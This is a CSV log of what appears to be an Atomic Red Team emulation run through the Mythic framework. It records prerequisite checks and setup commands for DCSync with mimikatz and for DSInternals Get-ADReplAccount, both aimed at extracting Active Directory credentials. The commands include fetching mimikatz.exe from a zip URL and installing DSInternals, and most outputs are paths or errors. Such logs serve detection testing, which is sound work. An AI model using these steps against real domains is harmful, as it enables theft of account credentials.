command,timestamp,status,api,name,GUID,description,platform,executor,timeout,callback_id,output
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:51:30.707805,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,16,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath
",2024-09-05T18:51:41.940454,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,16,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:51:52.010296,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,16,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:53:16.906933,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,16,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath
",2024-09-05T18:53:28.362987,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,16,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:53:37.886281,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,16,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:53:52.474458,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,16,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath
",2024-09-05T18:54:02.42985,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,16,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:54:13.568574,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,16,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
None,None,Failed,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],None,300,16,"[-] Failed to satisfy prerequisites for DCSync (Active Directory)
	get_prereq_command:  echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
"
"$RequiredModule = Get-Module -Name DSInternals -ListAvailable
if (-not $RequiredModule) {echo 'Test Failed'}
if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test Failed'} else {echo ""Test Passed""}
",2024-09-05T18:54:24.074929,success,mythic,Run DSInternals Get-ADReplAccount,a0bced08-3fc5-4d8b-93b7-e8344739376e,"The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
",['windows'],powershell,300,16,"Test Failed
ERROR: Cannot index into a null array.
ERROR: At line:5 char:5
ERROR: + if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test ...
ERROR: +     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : NullArray
ERROR:  
"
"Install-Module -Name DSInternals -Scope CurrentUser -Force
",2024-09-05T18:54:47.575592,success,mythic,Run DSInternals Get-ADReplAccount,a0bced08-3fc5-4d8b-93b7-e8344739376e,"The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
",['windows'],powershell,300,16,"ERROR: Exception calling ""ShouldContinue"" with ""2"" argument(s): ""PromptForChoice is not implemented.  The 
ERROR: script is asking for input, which is a problem since there's no console.  Make sure the script can 
ERROR: execute without prompting the user for input.""
ERROR: At C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\1.0.0.1\PSModule.psm1:7455 char:8
ERROR: +     if($Force -or $psCmdlet.ShouldContinue($shouldContinueQueryMessag ...
ERROR: +        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : NotImplementedException
ERROR:  
ERROR: Install-Module : NuGet provider is required to interact with NuGet-based repositories. Please 
ERROR: ensure that '2.8.5.201' or newer version of NuGet provider is installed.
ERROR: At line:3 char:1
ERROR: + Install-Module -Name DSInternals -Scope CurrentUser -Force
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [Install-Module], InvalidOperationException
ERROR:     + FullyQualifiedErrorId : CouldNotInstallNuGetProvider,Install-Module
ERROR:  
"
"$RequiredModule = Get-Module -Name DSInternals -ListAvailable
if (-not $RequiredModule) {echo 'Test Failed'}
if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test Failed'} else {echo ""Test Passed""}
",2024-09-05T18:54:59.494758,success,mythic,Run DSInternals Get-ADReplAccount,a0bced08-3fc5-4d8b-93b7-e8344739376e,"The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
